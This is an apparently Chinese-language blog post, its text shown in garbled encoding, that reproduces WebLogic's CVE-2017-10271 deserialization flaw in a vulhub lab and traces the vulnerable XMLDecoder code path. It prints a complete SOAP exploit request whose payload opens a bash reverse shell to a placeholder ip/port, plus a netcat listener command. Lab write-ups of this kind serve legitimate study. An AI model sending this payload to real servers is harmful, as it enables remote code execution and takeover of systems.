<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>weblogicååºåˆ—åŒ–æ¼æ´çš„åˆçº§ç†è§£(ä¸€) - ç¼–ç¨‹å¤§ç™½çš„åšå®¢</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="weblogicååºåˆ—åŒ–æ¼æ´çš„åˆçº§ç†è§£(ä¸€)" />
<meta property="og:description" content="å•¥æ˜¯weblogic
WebLogicæ˜¯Oracleå‘å¸ƒçš„ä¸€ä¸ªåŸºäºJAVAEEæ¶æ„çš„webä¸­é—´ä»¶
å¤§æ¦‚å¯ä»¥ç†è§£ä¸ºtomcat pro maxğŸ™ƒ
Weblogicååºåˆ—åŒ–æ¼æ´çš„å‡ ä¸ªåˆ©ç”¨é˜¶æ®µ
ä»åˆ©ç”¨æ–¹å¼æ¥çœ‹,åˆ†ä¸ºä¸‰ç±»
1.ç›´æ¥é€šè¿‡T3åè®®å‘é€æ¶æ„ååºåˆ—åŒ–å¯¹è±¡(CVE-2015-4582ã€CVE-2016-0638ã€CVE-2016-3510ã€CVE-2020-2555ã€CVE-2020-2883)
2.åˆ©ç”¨T3åè®®é…åˆRMPæˆ–NDæ¥å£åå‘å‘é€ååºåˆ—åŒ–æ•°æ®(CVE2017-3248ã€CVE2018-2628ã€CVE2018-2893ã€CVE2018-3245ã€CVE-2018-3191ã€CVE-2020-14644ã€CVE-2020-14645)è¿˜æœ‰åˆ©ç”¨IIOPåè®®çš„CVE-2020-2551
3.é€šè¿‡ javabean XMLæ–¹å¼å‘é€ååºåˆ—åŒ–æ•°æ®ã€‚(CVE2017-3506-&gt;CVE-2017-10271-&gt;CVE2019-2725-&gt;CVE-2019-2729)
æ¼æ´å¤ç°
ç”±äºæ¼æ´ä¼—å¤šï¼Œæ­å»ºç¯å¢ƒæ¯”è¾ƒå¤æ‚ï¼Œè¿˜æ˜¯å…ˆåˆ©ç”¨vulhubä¸­çš„CVE-2017-10271ã€CVE-2018-2628ã€CVE-2018-2894ã€CVE-2020-14882å‡ ä¸ªæ ‡å¿—æ€§çš„æ¼æ´ç¯å¢ƒè¿›è¡Œå¤ç°ã€‚
å…ˆä»æœ€å¤è€çš„å¼€å§‹
CVE-2017-10271
å½±å“èŒƒå›´ï¼š10.3.6.0.0ï¼Œ12.1.3.0.0ï¼Œ12.2.1.1.0ï¼Œ12.2.1.2.0
dockerå¼€å¯ç¯å¢ƒ
root@kali:/vulhub/weblogic/CVE-2017-10271# docker-compose up -d è¿œå¤ç‰ˆæœ¬ï¼Œç¯å¢ƒå¥½å¤§å…ˆå¿ä¸€ä¸‹
ç­‰å¾…çš„è¿‡ç¨‹ä¸­å…ˆç†è§£ä¸€ä¸‹æ¼æ´åŸç†ä»¥åŠvulhubç»™å‡ºçš„poc
è¯¥æ¼æ´ä¸»è¦é’ˆå¯¹weblogicçš„WLS-WebServicesç»„ä»¶
å±äºä¸Šè¿°ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨çš„ç¬¬ä¸‰ç±»
å¤§è‡´çš„åŸç†é€šè¿‡ä¼ è¾“javabean XMLæ–¹å¼æ„é€ æ¶æ„XMLæ•°æ®é€ æˆä»£ç æ‰§è¡Œ
ç»“åˆpocæ¥çœ‹
POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: your-ip:7001 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: text/xml Content-Length: 633 &lt;soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&#34;http://bea.com/2004/06/soap/workarea/&#34;&gt; &lt;java version=&#34;1.8.0_131&#34; class=&#34;java.beans.XMLDecoder&#34;&gt; &lt;void class=&#34;java.lang.ProcessBuilder&#34;&gt; &lt;array class=&#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/3f74952965b5c78ad3afa4b39ffdc949/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-08-27T10:25:31+08:00" />
<meta property="article:modified_time" content="2021-08-27T10:25:31+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="ç¼–ç¨‹å¤§ç™½çš„åšå®¢" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">ç¼–ç¨‹å¤§ç™½çš„åšå®¢</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">weblogicååºåˆ—åŒ–æ¼æ´çš„åˆçº§ç†è§£(ä¸€)</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p><strong>å•¥æ˜¯weblogic</strong></p> 
<blockquote> 
 <p>WebLogicæ˜¯Oracleå‘å¸ƒçš„ä¸€ä¸ªåŸºäºJAVAEEæ¶æ„çš„webä¸­é—´ä»¶<br> å¤§æ¦‚å¯ä»¥ç†è§£ä¸ºtomcat pro maxğŸ™ƒ</p> 
</blockquote> 
<p><strong>Weblogicååºåˆ—åŒ–æ¼æ´çš„å‡ ä¸ªåˆ©ç”¨é˜¶æ®µ</strong><br> ä»åˆ©ç”¨æ–¹å¼æ¥çœ‹,åˆ†ä¸ºä¸‰ç±»</p> 
<blockquote> 
 <p>1.ç›´æ¥é€šè¿‡T3åè®®å‘é€æ¶æ„ååºåˆ—åŒ–å¯¹è±¡(CVE-2015-4582ã€CVE-2016-0638ã€CVE-2016-3510ã€CVE-2020-2555ã€CVE-2020-2883)<br> 2.åˆ©ç”¨T3åè®®é…åˆRMPæˆ–NDæ¥å£åå‘å‘é€ååºåˆ—åŒ–æ•°æ®(CVE2017-3248ã€CVE2018-2628ã€CVE2018-2893ã€CVE2018-3245ã€CVE-2018-3191ã€CVE-2020-14644ã€CVE-2020-14645)è¿˜æœ‰åˆ©ç”¨IIOPåè®®çš„CVE-2020-2551<br> 3.é€šè¿‡ javabean XMLæ–¹å¼å‘é€ååºåˆ—åŒ–æ•°æ®ã€‚(CVE2017-3506-&gt;CVE-2017-10271-&gt;CVE2019-2725-&gt;CVE-2019-2729)</p> 
</blockquote> 
<p><strong>æ¼æ´å¤ç°</strong><br> ç”±äºæ¼æ´ä¼—å¤šï¼Œæ­å»ºç¯å¢ƒæ¯”è¾ƒå¤æ‚ï¼Œè¿˜æ˜¯å…ˆåˆ©ç”¨vulhubä¸­çš„CVE-2017-10271ã€CVE-2018-2628ã€CVE-2018-2894ã€CVE-2020-14882å‡ ä¸ªæ ‡å¿—æ€§çš„æ¼æ´ç¯å¢ƒè¿›è¡Œå¤ç°ã€‚</p> 
<p>å…ˆä»æœ€å¤è€çš„å¼€å§‹</p> 
<p><strong>CVE-2017-10271</strong></p> 
<p>å½±å“èŒƒå›´ï¼š10.3.6.0.0ï¼Œ12.1.3.0.0ï¼Œ12.2.1.1.0ï¼Œ12.2.1.2.0</p> 
<p>dockerå¼€å¯ç¯å¢ƒ</p> 
<pre><code class="prism language-powershell">root@kali:<span class="token operator">/</span>vulhub<span class="token operator">/</span>weblogic<span class="token operator">/</span>CVE<span class="token operator">-</span>2017<span class="token operator">-</span>10271<span class="token comment"># docker-compose up -d</span>
</code></pre> 
<p>è¿œå¤ç‰ˆæœ¬ï¼Œç¯å¢ƒå¥½å¤§å…ˆå¿ä¸€ä¸‹</p> 
<p>ç­‰å¾…çš„è¿‡ç¨‹ä¸­å…ˆç†è§£ä¸€ä¸‹æ¼æ´åŸç†ä»¥åŠvulhubç»™å‡ºçš„poc</p> 
<blockquote> 
 <p>è¯¥æ¼æ´ä¸»è¦é’ˆå¯¹weblogicçš„WLS-WebServicesç»„ä»¶<br> å±äºä¸Šè¿°ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨çš„ç¬¬ä¸‰ç±»<br> å¤§è‡´çš„åŸç†é€šè¿‡ä¼ è¾“javabean XMLæ–¹å¼æ„é€ æ¶æ„XMLæ•°æ®é€ æˆä»£ç æ‰§è¡Œ</p> 
</blockquote> 
<p>ç»“åˆpocæ¥çœ‹</p> 
<pre><code class="prism language-XML">POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 633

&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
    &lt;soapenv:Header&gt;
        &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;
            &lt;java version="1.8.0_131" class="java.beans.XMLDecoder"&gt;
                &lt;void class="java.lang.ProcessBuilder"&gt;
                    &lt;array class="java.lang.String" length="3"&gt;
                        &lt;void index="0"&gt;
                            &lt;string&gt;/bin/bash&lt;/string&gt;
                        &lt;/void&gt;
                        &lt;void index="1"&gt;
                            &lt;string&gt;-c&lt;/string&gt;
                        &lt;/void&gt;
                        &lt;void index="2"&gt;
                            &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&lt;/string&gt;
                        &lt;/void&gt;
                    &lt;/array&gt;
                    &lt;void method="start" /&gt;
                &lt;/void&gt;
            &lt;/java&gt;
        &lt;/work:WorkContext&gt;
    &lt;/soapenv:Header&gt;
    &lt;soapenv:Body /&gt;
&lt;/soapenv:Envelope&gt;
</code></pre> 
<p>å¤§æ¦‚æ˜¯å‘ç½‘ç«™çš„/wls-wsat/CoordinatorPortTypeè·¯å¾„ä¼ å…¥xmlæ•°æ®ï¼Œè¿™ä¸²xmlç›®çš„æ˜¯åå¼¹shell<br> <img src="https://images2.imgbox.com/c9/ab/Y9a5bm1H_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> OKï¼Œç¯å¢ƒèµ·å¥½å¼€å§‹å¤ç°</p> 
<p>è®¿é—®localhost:7001/wls-wsat/CoordinatorPortTypeï¼Œæ˜¾ç¤ºwls-wsatç»„ä»¶çš„ä¸€äº›é…ç½®ä¿¡æ¯ï¼Œè¡¨ç¤ºæœåŠ¡å·²ç»å¼€å¯<br> <img src="https://images2.imgbox.com/02/04/Ds5Wh1ya_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> æœ¬åœ°ç›‘å¬6666ç«¯å£</p> 
<pre><code class="prism language-powershell">root@kali:<span class="token operator">/</span><span class="token comment"># nc -l -p 6666</span>
</code></pre> 
<p>bpæŠ“åŒ…é‡æ”¾æ„é€ å¥½çš„æ•°æ®åŒ…ï¼Œæ³¨æ„å­—æ®µContent-Typeæ”¹ä¸ºtext/xml<br> <img src="https://images2.imgbox.com/32/97/YtmHVm3q_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> æˆåŠŸåå¼¹shellï¼ŒæœåŠ¡å™¨æ‰§è¡Œäº†æˆ‘ä»¬ä¼ å…¥çš„<br> /bin/bash -c bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1<br> <img src="https://images2.imgbox.com/38/f5/NHAvWZLe_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p> 
<h3><a id="_89"></a>æ¼æ´åŸç†</h3> 
<p>æ¼æ´åˆ©ç”¨çš„è¿‡ç¨‹å¾ˆç®€å•<br> æœ‰ä¸¤ä¸ªç–‘é—®ç‚¹</p> 
<blockquote> 
 <p>1.wls-wsatç»„ä»¶å¦‚ä½•å¤„ç†xmlæ•°æ®<br> 2.é€ æˆååºåˆ—åŒ–æ¼æ´çš„å…³é”®ç‚¹åœ¨å“ª</p> 
</blockquote> 
<p>å°è¯•ä¼ å…¥ä»»æ„å‘½ä»¤<br> <img src="https://images2.imgbox.com/32/71/UkBtnPTs_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> åœ¨å“åº”ä¸­çœ‹åˆ°äº†è¿”å›çš„xmlæ•°æ®ä»¥åŠæ•´ä¸ªå¤„ç†è¿‡ç¨‹çš„è°ƒç”¨æ ˆ<br> <img src="https://images2.imgbox.com/7d/5e/u1Dr5gW6_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> <img src="https://images2.imgbox.com/50/51/VqUxfikd_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> å¯ä»¥çœ‹åˆ°å¤„ç†è¿‡ç¨‹æœ€åè°ƒç”¨äº†<code>java.beans.XMLDecoder</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”¨äºå°†XMLæ•°æ®ååºåˆ—åŒ–ä¸ºjavaå¯¹è±¡ï¼Œè¿™é‡Œé€ æˆäº†æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œ</p> 
<p>æ ¹æ®<a href="https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md">vulhubæä¾›çš„æŠ€æœ¯æ–‡æ¡£</a>ã€å‚è€ƒ<a href="https://blog.51cto.com/skytina/2055335" rel="nofollow">å¤§ä½¬çš„åˆ†æè¿‡ç¨‹</a>å¯ä»¥å¾—çŸ¥å¤§è‡´çš„å¤„ç†è¿‡ç¨‹<br> <img src="https://images2.imgbox.com/07/d0/PLjjjcoG_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p> 
<blockquote> 
 <p>1.æ ¹æ®POCï¼Œå½“æˆ‘ä»¬ä¼ å…¥&lt;soapenv&gt;æ ‡ç­¾åŒ…è£¹çš„æ•°æ®æ—¶ï¼Œwls-wsatä½¿ç”¨äº†weblogicè‡ªå¸¦çš„webserviceså¤„ç†ç¨‹åºæ¥å¤„ç†SOAPè¯·æ±‚<br> 2.è¯¥å¤„ç†ç¨‹åºé¦–å…ˆè°ƒç”¨weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequestæ–¹æ³•è·å–åˆ°æˆ‘ä»¬ä¼ å…¥çš„xmlæ•°æ®ä¸ºvar1ï¼Œå®šä¹‰var2ä¸ºå¤„ç†è¿‡çš„var1æ•°æ®<br> 3.é€šè¿‡var2.get()æ–¹æ³•ä¸­çš„WorkAreaConstants.WORK_AREA_HEADERå‚æ•°è·å–&lt;work:WorkContext &gt;æ ‡ç­¾ä¸­çš„å†…å®¹<br> 4.å½“var3ä¸ä¸ºç©ºæ—¶ï¼Œæ‰§è¡ŒreadHeaderOld(var3);</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/1b/a0/a2LcM1Nt_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p> 
<blockquote> 
 <p>5.åœ¨readHeaderOldä¸­ï¼Œå®ä¾‹åŒ–äº†WorkContextXmlInputAdapterï¼Œæ­¤æ—¶æ–¹æ³•å†…çš„var4æ˜¯javaæ ‡ç­¾é‡Œçš„å†…å®¹</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/d8/c3/cFU0vm0J_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p> 
<blockquote> 
 <p>6.åœ¨å®ä¾‹åŒ–WorkContextXmlInputAdapterä¸­ï¼Œç›´æ¥è°ƒç”¨xmlDecoderååºåˆ—åŒ–ä¼ å…¥çš„xmlæ•°æ®ï¼Œä¹Ÿå°±æ˜¯å¤„ç†è¿‡çš„var4</p> 
</blockquote> 
<p>ä»æ•´ä¸ªè¿‡ç¨‹ä¸­å¯ä»¥å‘ç°ï¼Œä¼ å…¥çš„xmlæ•°æ®ä»å§‹è‡³ç»ˆéƒ½æ²¡æœ‰å—åˆ°ä»»ä½•è¿‡æ»¤ï¼Œwls-wsatçš„ç±»ä¼¼å‰¥æ´‹è‘±çš„å¤„ç†æ–¹å¼ä¸€å±‚ä¸€å±‚æ­å¼€æœ€åç›´æ¥ååºåˆ—åŒ–ï¼Œè¿™æ ·æ˜¾ç„¶æ˜¯å¾ˆä¸å®‰å…¨æ»´ã€‚</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/c8923ca3634f3a752234a15cd7e27241/" rel="prev">
			<span class="pager__subtitle">Â«&thinsp;Previous</span>
			<p class="pager__title">MySQLæ€ä¹ˆå­˜å‚¨è¡¨æƒ…</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/a539c85a69e16876c58f15deef5cec16/" rel="next">
			<span class="pager__subtitle">Next&thinsp;Â»</span>
			<p class="pager__title">ç§»é™¤æœªçŸ¥çš„[unknown]çš„é€»è¾‘å·</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 ç¼–ç¨‹å¤§ç™½çš„åšå®¢.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>